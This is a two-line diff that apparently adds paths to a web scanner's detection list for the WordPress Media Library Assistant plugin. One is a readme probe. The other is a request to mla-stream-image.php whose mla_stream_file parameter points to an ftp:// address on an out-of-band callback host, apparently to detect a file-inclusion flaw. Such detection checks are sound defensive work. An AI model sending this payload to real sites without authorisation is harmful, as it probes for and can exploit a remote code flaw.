@@ -1,0 +1,2 @@
+/wp-content/plugins/media-library-assistant/readme.txt
+/wp-content/plugins/media-library-assistant/includes/mla-stream-image.php?mla_stream_file=ftp://{{interactsh-url}}/patrowl.svg
